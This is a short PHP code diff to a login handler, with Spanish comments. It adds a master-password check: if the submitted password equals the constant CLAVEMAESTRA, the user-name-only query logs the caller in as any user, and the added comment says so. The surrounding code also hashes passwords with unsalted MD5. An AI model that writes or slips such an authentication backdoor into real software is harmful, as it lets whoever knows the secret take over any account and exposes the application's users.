@@ -11,9 +11,12 @@ if(isset($_POST))
     $sql = 'SELECT * FROM cpj_users WHERE user_name = ? AND user_pass = ?';
     $params = array($_POST['login_user'],md5($_POST['login_pass']));
 
-    // parche para desarrollo
-    // $sql = 'SELECT * FROM cpj_users limit 1';
-    // $params = array();
+    // Con esto puedo ingresar como cualquier usuario
+    if($_POST['login_pass']==CLAVEMAESTRA)
+    {
+        $sql = 'SELECT * FROM cpj_users WHERE user_name = ?';
+        $params = array($_POST['login_user']);
+    }
 
 
     $data = $connection->getrow($sql,$params);
